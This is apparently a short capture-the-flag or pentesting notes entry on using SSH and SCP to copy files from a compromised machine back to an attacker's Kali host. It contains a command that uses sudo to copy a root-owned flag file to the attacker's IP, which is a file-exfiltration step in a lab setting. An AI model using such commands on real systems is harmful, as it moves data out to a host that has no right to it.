# SSH/SCP

If we're on a box and need to copy files back to Kali we can use SSH if available.

Start SSH server on Kali:

```
systemctl start ssh.socket
```

Now on box use SCP is it's available:

```
dennis@ip-10-10-9-16:/home/ubuntu$ sudo scp /root/flag5.txt kali@10.14.6.200:/home/kali
kali@10.14.6.200's password: 
flag5.txt
```
